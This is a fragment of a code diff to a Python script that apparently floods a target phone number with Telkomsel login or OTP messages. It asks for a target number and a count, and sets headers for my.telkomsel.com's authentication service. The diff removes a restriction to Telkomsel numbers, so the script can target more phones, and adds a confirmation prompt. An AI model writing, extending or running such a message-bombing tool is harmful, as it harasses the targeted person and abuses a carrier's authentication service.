@@ -11,9 +11,8 @@ try:
 
 [ex] +628XXXXXXXXX""")
 	no=input("[?] No target: ")
-	if '+62821' not in no:
-		exit("[!] telkomsel only")
 	jml=int(input("[?] Jumlah: "))
+	input("[!] apakah nomor: "+no+" sudah benar? [press enter]")
 	print()
 	header = {'Auth0-Client':'eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiNy42LjEifQ',
 	'Origin':'https://my.telkomsel.com',
